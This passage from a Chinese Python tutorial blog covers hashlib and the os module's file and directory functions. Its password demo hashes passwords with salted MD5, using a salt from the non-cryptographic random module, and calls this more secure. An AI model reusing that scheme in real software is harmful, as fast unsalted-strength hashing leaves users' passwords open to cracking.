class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.sha256(<span class="string">b'HackerLee'</span>).hexdigest()</span><br><span class="line"><span class="string">'d1b84ea427a5766c81571fb04590e4e2f03bb495a1926f6c25bb2d91d5492224'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.sha256(<span class="string">b'HackerLee'</span>).digest()</span><br><span class="line"><span class="string">b'\xd1\xb8N\xa4\'\xa5vl\x81W\x1f\xb0E\x90\xe4\xe2\xf0;\xb4\x95\xa1\x92ol%\xbb-\x91\xd5I"$'</span></span><br></pre></td></tr></table></figure><h4 id="4-实际应用"><a href="#4-实际应用" class="headerlink" title="4.实际应用"></a>4.实际应用</h4><p><code>根据用户输入的登录名和口令模拟用户注册，计算更安全的MD5</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,usr,password)</span>:</span></span><br><span class="line">        self.usr = usr</span><br><span class="line">        self.salt = <span class="string">''</span>.join([chr(random.randint(<span class="number">48</span>, <span class="number">122</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)])</span><br><span class="line">        self._getMd5</span><br><span class="line">        self.password = self._getMd5(password+self.salt)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_getMd5</span><span class="params">(self,password)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(password.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    user = db[username]</span><br><span class="line">    salt = user.salt</span><br><span class="line">    <span class="keyword">return</span> user.password == user._getMd5(password+salt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    db = &#123;</span><br><span class="line">    <span class="string">'michael'</span>: User(<span class="string">'michael'</span>, <span class="string">'123456'</span>),</span><br><span class="line">    <span class="string">'bob'</span>: User(<span class="string">'bob'</span>, <span class="string">'abc999'</span>),</span><br><span class="line">    <span class="string">'alice'</span>: User(<span class="string">'alice'</span>, <span class="string">'alice2008'</span>)</span><br><span class="line">&#125;   </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> login(<span class="string">"bob"</span>,<span class="string">"adbc999"</span>)</span><br><span class="line">    <span class="keyword">except</span> AssertionError:</span><br><span class="line">        print(<span class="string">"Your username or password is wrong"</span>)</span><br></pre></td></tr></table></figure><h3 id="0x08-os-模块"><a href="#0x08-os-模块" class="headerlink" title="0x08 os 模块"></a>0x08 os 模块</h3><h4 id="1-os-name"><a href="#1-os-name" class="headerlink" title="1.os.name"></a>1.os.name</h4><blockquote><p>指示你正在使用的工作平台。比如对于Windows，它是’nt’，而对于Linux/Unix用户，它是’posix’</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.name</span><br><span class="line"><span class="string">'nt'</span></span><br></pre></td></tr></table></figure><h4 id="2-os-listdir-方法"><a href="#2-os-listdir-方法" class="headerlink" title="2.os.listdir() 方法"></a>2.os.listdir() 方法</h4><blockquote><p>os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</p><p>它不包括 <strong>.</strong> 和 <strong>..</strong> 即使它在文件夹中。只支持在 Unix, Windows 下使用。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">path = <span class="string">"/var/www/html/"</span></span><br><span class="line">dirs = os.listdir( path )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出所有文件和文件夹</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> dirs:</span><br><span class="line">   print(file)</span><br></pre></td></tr></table></figure><p>执行以上程序输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">test.htm</span><br><span class="line">stamp</span><br><span class="line">faq.htm</span><br><span class="line">_vti_txt</span><br><span class="line">robots.txt</span><br><span class="line">itemlisting</span><br><span class="line">resumelisting</span><br><span class="line">writing_effective_resume.htm</span><br><span class="line">advertisebusiness.htm</span><br><span class="line">papers</span><br><span class="line">resume</span><br></pre></td></tr></table></figure><h4 id="3-os-walk-方法"><a href="#3-os-walk-方法" class="headerlink" title="3.os.walk() 方法"></a>3.os.walk() 方法</h4><blockquote><p>os.walk() 方法用于通过在目录树中游走输出在目录中的文件名，向上或者向下。os.walk() 方法是一个简单易用的文件、目录遍历器，可以帮助我们高效的处理文件、目录方面的事情。在Unix，Windows中有效。</p><p><b>walk()</b>方法语法格式如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.walk(top[, topdown=True[, onerror=None[, followlinks=False]]])</span><br></pre></td></tr></table></figure><p> <code>参数</code><br>&gt;</p><blockquote><ul><li><strong>top</strong> — 是你所要遍历的目录的地址, 返回的是一个三元组<strong>(root,dirs,files)</strong>。<ul><li><strong>root</strong> 所指的是当前正在遍历的这个文件夹的本身的地址</li><li><strong>dirs</strong> 是一个 list ，内容是该文件夹中所有的目录的名字(不包括子目录)</li><li><strong>files</strong> 同样是 list , 内容是该文件夹中所有的文件(不包括子目录)</li></ul></li><li><strong>topdown</strong> —可选，为 True，则优先遍历 top 目录，否则优先遍历 top 的子目录(默认为开启)。如果 topdown 参数为 True，walk 会遍历top文件夹，与top 文件夹中每一个子目录。</li><li><strong>onerror</strong> — 可选，需要一个 callable 对象，当 walk 需要异常时，会调用。</li><li><strong>followlinks</strong> — 可选，如果为 True，则会遍历目录下的快捷方式(linux 下是软连接 symbolic link )实际所指的目录(默认关闭)，如果为 False，则优先遍历 top 的子目录。</li></ul></blockquote><p><code>直接打印</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fileNumber</span><span class="params">(path)</span>:</span></span><br><span class="line">    dir1, dir2, dir3, dir4  = os.walk(path)</span><br><span class="line">    print(<span class="string">"dir1:"</span>,dir1)</span><br><span class="line">    print(<span class="string">"dir2:"</span>,dir2)</span><br><span class="line">    print(<span class="string">"dir3:"</span>,dir3)</span><br><span class="line">    print(<span class="string">"dir4:"</span>,dir4)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    path = input(<span class="string">"Please input your path..."</span>)</span><br><span class="line">    fileNumber(path)</span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir1: (<span class="string">'E:\\学习文件夹\\python学习'</span>, [<span class="string">'2'</span>, <span class="string">'Python常实现的功能'</span>, <span class="string">'Python常实现的功能 - 副本'</span>], [<span class="string">'learning.py'</span>, <span class="string">'Python3 元组 _ 菜鸟教程.pdf'</span>, <span class="string">'Python3 列表 _ 菜鸟教程.pdf'</span>, <span class="string">'Python3 字典 _ 菜鸟教程.pdf'</span>, <span class="string">'Python3 字符串 _ 菜鸟教</span></span><br><span class="line"><span class="string">程.pdf'</span>, <span class="string">'Python3 数字(Number) _ 菜鸟教程.pdf'</span>])</span><br><span class="line">dir2: (<span class="string">'E:\\学习文件夹\\python学习\\2'</span>, [], [<span class="string">'2-5.py'</span>, <span class="string">'2-6.py'</span>, <span class="string">'2-7.py'</span>, <span class="string">'2-8.py'</span>, <span class="string">'2-9.py'</span>])</span><br><span class="line">dir3: (<span class="string">'E:\\学习文件夹\\python学习\\Python常实现的功能'</span>, [], [<span class="string">'1.计算n阶乘.py'</span>, <span class="string">'2.列出当前目录下的所有文件和目录名.py'</span>])</span><br><span class="line">dir4: (<span class="string">'E:\\学习文件夹\\python学习\\Python常实现的功能 - 副本'</span>, [], [<span class="string">'1.计算n阶乘.py'</span>, <span class="string">'2.列出当前目录下的所有文件和目录名.py'</span>])</span><br></pre></td></tr></table></figure><p><code>for循环</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fileNumber</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> dirpath, dirs, files <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> files:</span><br><span class="line">            print(dirpath+<span class="string">"\\"</span>+i)</span><br><span class="line">    <span class="keyword">for</span> dirpath, dirs, files <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        print(dirpath)</span><br><span class="line">    <span class="keyword">for</span> dirpath, dirs, files <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        print(dirs)</span><br><span class="line">    <span class="keyword">for</span> dirpath, dirs, files <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        print(files)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    path = input(<span class="string">"Please input your path..."</span>)</span><br><span class="line">    fileNumber(path)</span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">E:\学习文件夹\python学习\learning.py</span><br><span class="line">E:\学习文件夹\python学习\Python3 元组 _ 菜鸟教程.pdf</span><br><span class="line">E:\学习文件夹\python学习\Python3 列表 _ 菜鸟教程.pdf</span><br><span class="line">E:\学习文件夹\python学习\Python3 字典 _ 菜鸟教程.pdf</span><br><span class="line">E:\学习文件夹\python学习\Python3 字符串 _ 菜鸟教程.pdf</span><br><span class="line">E:\学习文件夹\python学习\Python3 数字(Number) _ 菜鸟教程.pdf</span><br><span class="line">E:\学习文件夹\python学习\<span class="number">2</span>\<span class="number">2</span><span class="number">-5.</span>py</span><br><span class="line">E:\学习文件夹\python学习\<span class="number">2</span>\<span class="number">2</span><span class="number">-6.</span>py</span><br><span class="line">E:\学习文件夹\python学习\<span class="number">2</span>\<span class="number">2</span><span class="number">-7.</span>py</span><br><span class="line">E:\学习文件夹\python学习\<span class="number">2</span>\<span class="number">2</span><span class="number">-8.</span>py</span><br><span class="line">E:\学习文件夹\python学习\<span class="number">2</span>\<span class="number">2</span><span class="number">-9.</span>py</span><br><span class="line">E:\学习文件夹\python学习\<span class="number">2</span>\<span class="number">1</span>\新建文本文档.txt</span><br><span class="line">E:\学习文件夹\python学习\Python常实现的功能\<span class="number">1.</span>计算n阶乘.py</span><br><span class="line">E:\学习文件夹\python学习\Python常实现的功能\<span class="number">2.</span>列出当前目录下的所有文件和目录名.py</span><br><span class="line"></span><br><span class="line">E:\学习文件夹\python学习</span><br><span class="line">E:\学习文件夹\python学习\<span class="number">2</span></span><br><span class="line">E:\学习文件夹\python学习\<span class="number">2</span>\<span class="number">1</span></span><br><span class="line">E:\学习文件夹\python学习\Python常实现的功能</span><br><span class="line">[<span class="string">'2'</span>, <span class="string">'Python常实现的功能'</span>]</span><br><span class="line">[<span class="string">'1'</span>]</span><br><span class="line">[]</span><br><span class="line">[]</span><br><span class="line">[<span class="string">'learning.py'</span>, <span class="string">'Python3 元组 _ 菜鸟教程.pdf'</span>, <span class="string">'Python3 列表 _ 菜鸟教程.pdf'</span>, <span class="string">'Python3 字典 _ 菜鸟教程.pdf'</span>, <span class="string">'Python3 字符串 _ 菜鸟教程.pdf'</span>, <span class="string">'Python3 数字(Number) _ 菜鸟教程.pdf'</span>]</span><br><span class="line">[<span class="string">'2-5.py'</span>, <span class="string">'2-6.py'</span>, <span class="string">'2-7.py'</span>, <span class="string">'2-8.py'</span>, <span class="string">'2-9.py'</span>]</span><br><span class="line">[<span class="string">'新建文本文档.txt'</span>]</span><br><span class="line">[<span class="string">'1.计算n阶乘.py'</span>, <span class="string">'2.列出当前目录下的所有文件和目录名.py'</span>]</span><br></pre></td></tr></table></figure><blockquote><p>要和os.listdir()区分开来，os.listdir(path)只是返回当前目录下的文件和文件夹名，而os.walk(path)是将当前目录下以及每个文件夹中包含的文件全部返回</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.listdir(<span class="string">"E:\学习文件夹\二进制"</span>)</span><br><span class="line">[<span class="string">'AFL'</span>, <span class="string">'CVE'</span>, <span class="string">'Pwn'</span>, <span class="string">'pwn 题工具'</span>, <span class="string">'Understanding_ELF.pdf'</span>, <span class="string">'w.py'</span>, <span class="string">'程序理解'</span>]</span><br></pre></td></tr></table></figure><h4 id="4-os-mkdir-path-mode-方法"><a href="#4-os-mkdir-path-mode-方法" class="headerlink" title="4.os.mkdir(path[, mode]) 方法"></a>4.os.mkdir(path[, mode]) 方法</h4><blockquote><p>创建目录，以数字mode的mode创建一个名为path的文件夹.默认的 mode 是 0777 (八进制)。</p><p><code>概述</code></p><p>os.mkdir() 方法用于以数字权限模式创建目录。默认的模式为 0777 (八进制)。</p><p>如果目录有多级，则创建最后一级，如果最后一级目录的上级目录有不存在的，则会抛出一个 OSError。</p><p><code>语法</code></p><p><b>mkdir()</b>方法语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.mkdir(path[, mode])</span><br></pre></td></tr></table></figure></blockquote><p><code>参数</code></p><p>&gt;</p><blockquote><ul><li><strong>path</strong> — 要创建的目录，可以是相对或者绝对路径。</li><li><strong>mode</strong> — 要为目录设置的权限数字模式。</li></ul><p><code>返回值</code></p><p>该方法没有返回值。</p></blockquote><h4 id="5-os-rmdir-path-方法"><a href="#5-os-rmdir-path-方法" class="headerlink" title="5.os.rmdir(path) 方法"></a>5.os.rmdir(path) 方法</h4><blockquote><p><code>概述</code></p><p>os.rmdir() 方法用于删除指定路径的目录。仅当这文件夹是空的才可以, 否则, 抛出OSError。</p><p><code>语法</code></p><p><strong>rmdir()</strong>方法语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; os.rmdir(path)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p><code>参数</code></p><ul><li><strong>path</strong> — 要删除的目录路径</li></ul><p><code>返回值</code></p><p>该方法没有返回值</p></blockquote><h4 id="6-os-system-shell-方法"><a href="#6-os-system-shell-方法" class="headerlink" title="6.os.system(shell) 方法"></a>6.os.system(shell) 方法</h4><blockquote><p>运行shell命令</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">"ping www.baidu.com"</span>)</span><br><span class="line"></span><br><span class="line">正在 Ping www.a.shifen.com [<span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae] 具有 <span class="number">32</span> 字节的数据:</span><br><span class="line">来自 <span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae 的回复: 时间=<span class="number">184</span>ms</span><br><span class="line">来自 <span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae 的回复: 时间=<span class="number">136</span>ms</span><br><span class="line">来自 <span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae 的回复: 时间=<span class="number">140</span>ms</span><br><span class="line">来自 <span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae 的回复: 时间=<span class="number">181</span>ms</span><br><span class="line"></span><br><span class="line"><span class="number">2409</span>:<span class="number">8</span>c00:<span class="number">6</span>c21:<span class="number">104</span>f:<span class="number">0</span>:ff:b03f:<span class="number">3</span>ae 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = <span class="number">4</span>，已接收 = <span class="number">4</span>，丢失 = <span class="number">0</span> (<span class="number">0</span>% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = <span class="number">136</span>ms，最长 = <span class="number">184</span>ms，平均 = <span class="number">160</span>ms</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="7-os-renames-old-new-方法"><a href="#7-os-renames-old-new-方法" class="headerlink" title="7.os.renames(old, new) 方法"></a>7.os.renames(old, new) 方法</h4><blockquote><p><code>概述</code></p><p>os.renames() 方法用于递归重命名目录或文件。类似rename()。</p><p><code>语法</code></p><p><strong>renames()</strong>方法语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; os.renames(old, new)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p><code>参数</code></p><ul><li><strong>old</strong> — 要重命名的目录</li><li><strong>new</strong> —文件或目录的新名字。甚至可以是包含在目录中的文件，或者完整的目录树。</li></ul><p><code>返回值</code></p><p>该方法没有返回值</p></blockquote><h4 id="8-os-path-模块"><a href="#8-os-path-模块" class="headerlink" title="8.os.path 模块"></a>8.os.path 模块</h4><p>os.path 模块主要用于获取文件的属性。</p><blockquote><p>以下是 os.path 模块的几种常用方法：</p></blockquote><div class="table-container"><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">os.path.abspath(path)</td><td style="text-align:left">返回绝对路径</td></tr><tr><td style="text-align:left">os.path.basename(path)</td><td style="text-align:left">返回文件名</td></tr><tr><td style="text-align:left">os.path.commonprefix(list)</td><td style="text-align:left">返回list(多个路径)中，所有path共有的最长的路径</td></tr><tr><td style="text-align:left">os.path.dirname(path)</td><td style="text-align:left">返回文件路径</td></tr><tr><td style="text-align:left"><strong>os.path.exists(path)</strong></td><td style="text-align:left">如果路径 path 存在，返回 True；如果路径 path 不存在，返回 False。</td></tr><tr><td style="text-align:left">os.path.lexists</td><td style="text-align:left">路径存在则返回True,路径损坏也返回True</td></tr><tr><td style="text-align:left">os.path.endswith(format)</td><td style="text-align:left">判断文件是否是format的格式</td></tr><tr><td style="text-align:left">os.path.expanduser(path)</td><td style="text-align:left">把path中包含的”~”和”~user”转换成用户目录</td></tr><tr><td style="text-align:left">os.path.expandvars(path)</td><td style="text-align:left">根据环境变量的值替换path中包含的”$name”和”${name}”</td></tr><tr><td style="text-align:left"><strong>os.path.getatime(path)</strong></td><td style="text-align:left">返回最近访问时间（浮点型秒数）</td></tr><tr><td style="text-align:left"><strong>os.path.getmtime(path)</strong></td><td style="text-align:left">返回最近文件修改时间</td></tr><tr><td style="text-align:left"><strong>os.path.getctime(path)</strong></td><td style="text-align:left">返回文件 path 创建时间</td></tr><tr><td style="text-align:left"><strong>os.path.getsize(path)</strong></td><td style="text-align:left">返回文件大小，如果文件不存在就返回错误</td></tr><tr><td style="text-align:left">os.path.isabs(path)</td><td style="text-align:left">判断是否为绝对路径</td></tr><tr><td style="text-align:left"><strong>os.path.isfile(path)</strong></td><td style="text-align:left">判断路径是否为文件</td></tr><tr><td style="text-align:left"><strong>os.path.isdir(path)</strong></td><td style="text-align:left">判断路径是否为目录</td></tr><tr><td style="text-align:left">os.path.islink(path)</td><td style="text-align:left">判断路径是否为链接</td></tr><tr><td style="text-align:left">os.path.ismount(path)</td><td style="text-align:left">判断路径是否为挂载点</td></tr><tr><td style="text-align:left">os.path.join(path1[, path2[, …]])</td><td style="text-align:left">把目录和文件名合成一个路径</td></tr><tr><td style="text-align:left">os.path.normcase(path)</td><td style="text-align:left">转换path的大小写和斜杠</td></tr><tr><td style="text-align:left">os.path.normpath(path)</td><td style="text-align:left">规范path字符串形式</td></tr><tr><td style="text-align:left">os.path.realpath(path)</td><td style="text-align:left">返回path的真实路径</td></tr><tr><td style="text-align:left">os.path.relpath(path[, start])</td><td style="text-align:left">从start开始计算相对路径</td></tr><tr><td style="text-align:left">os.path.samefile(path1, path2)</td><td style="text-align:left">判断目录或文件是否相同</td></tr><tr><td style="text-align:left">os.path.sameopenfile(fp1, fp2)</td><td style="text-align:left">判断fp1和fp2是否指向同一文件</td></tr><tr><td style="text-align:left">os.path.samestat(stat1, stat2)</td><td style="text-align:left">判断stat tuple stat1和stat2是否指向同一个文件</td></tr><tr><td style="text-align:left">os.path.split(path)</td><td style="text-align:left">把路径分割成 dirname 和 basename，返回一个元组</td></tr><tr><td style="text-align:left">os.path.splitdrive(path)</td><td style="text-align:left">一般用在 windows 下，返回驱动器名和路径组成的元组</td></tr><tr><td style="text-align:left">os.path.splitext(path)</td><td style="text-align:left">分割路径，返回路径名和文件扩展名的元组</td></tr><tr><td style="text-align:left">os.path.splitunc(path)</td><td style="text-align:left">把路径分割为加载点与文件</td></tr><tr><td style="text-align:left">os.path.walk(path, visit, arg)</td><td style="text-align:left">遍历path，进入每个目录都调用visit函数，visit函数必须有3个参数(arg, dirname, names)，dirname表示当前目录的目录名，names代表当前目录下的所有文件名，args则为walk的第三个参数</td></tr><tr><td style="text-align:left">os.path.supports_unicode_filenames</td><td style="text-align:left">设置是否支持unicode路径名</td></tr></tbody></table></div><p><code>相关知识</code></p><p><code>如何知道一个“指针是否到达了文件尾”</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fo = open(<span class="string">"1.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fo.name</span><br><span class="line"><span class="string">'1.txt'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fo.tell()</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fo.readline()</span><br><span class="line"><span class="string">'w\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fo.tell()</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fo.readlines()</span><br><span class="line">[<span class="string">'w\n'</span>, <span class="string">'d\n'</span>, <span class="string">'\n'</span>, <span class="string">'d\n'</span>, <span class="string">'asd\n'</span>, <span class="string">'asd\n'</span>, <span class="string">'c\n'</span>, <span class="string">'\n'</span>, <span class="string">'c\n'</span>, <span class="string">'c\n'</span>, <span class="string">'dsc\n'</span>, <span class="string">'ds\n'</span>, <span class="string">'c\n'</span>, <span class="string">'dsc\n'</span>, <span class="string">'ds\n'</span>, <span class="string">'v\n'</span>, <span class="string">'dv\n'</span>, <span class="string">'ds\n'</span>, <span class="string">'v\n'</span>, <span class="string">'dsv\n'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fo.tell()</span><br><span class="line"><span class="number">54</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> os.path <span class="keyword">import</span> getsize</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getsize(<span class="string">"1.txt"</span>)</span><br><span class="line"><span class="number">54</span></span><br></pre></td></tr></table></figure><h4 id="9-其他功能"><a href="#9-其他功能" class="headerlink" title="9.其他功能"></a>9.其他功能</h4><p><a href="https://docs.python.org/zh-cn/3.7/library/os.html" target="_blank" rel="noopener">OS 官方文档</a></p><div class="table-container"><table><thead><tr><th>os.*</th><th>功能</th></tr></thead><tbody><tr><td><font color="brown"><strong>进程参数</strong></font></td><td></td></tr><tr><td><code>getegid</code>()</td><td>返回当前进程的有效组ID。对应当前进程执行文件的 “set id” 位</td></tr><tr><td><code>geteuid</code>()</td><td>返回当前进程的有效用户ID</td></tr><tr><td><code>getpid</code>()</td><td>返回当前进程ID</td></tr><tr><td><code>getppid</code>()</td><td>返回父进程ID。<br>当父进程已经结束，在Unix中返回的ID是初始进程(1)中的一个，<br>在Windows中仍然是同一个进程ID，该进程ID有可能已经被进行进程所占用。</td></tr><tr><td><font color="brown"><strong>文件和目录</strong></font></td><td></td></tr><tr><td><code>chdir</code>(<em>path</em>)</td><td>将当前工作目录更改为 <em>path</em></td></tr><tr><td><code>getcwd</code>()</td><td>返回表示当前工作目录的字符串。</td></tr><tr><td><code>mkdir</code>(<em>path</em>, <em>mode=0o777</em>, *, <em>dir_fd=None</em>)</td><td>创建一个名为 <em>path</em> 的目录，应用以数字表示的权限模式 <em>mode</em>。</td></tr><tr><td><code>remove</code>(<em>path</em>, *, <em>dir_fd=None</em>)</td><td>移除（删除）文件 <em>path</em>。<br>如果 <em>path</em> 是目录，则抛出 <a href="https://docs.python.org/zh-cn/3.7/library/exceptions.html#IsADirectoryError" target="_blank" rel="noopener"><code>IsADirectoryError</code></a> 异常。<br>请使用 <a href="https://docs.python.org/zh-cn/3.7/library/os.html#os.rmdir" target="_blank" rel="noopener"><code>rmdir()</code></a> 删除目录。</td></tr><tr><td><code>rename</code>(<em>src</em>, <em>dst</em>, *, <em>src_dir_fd=None</em>, 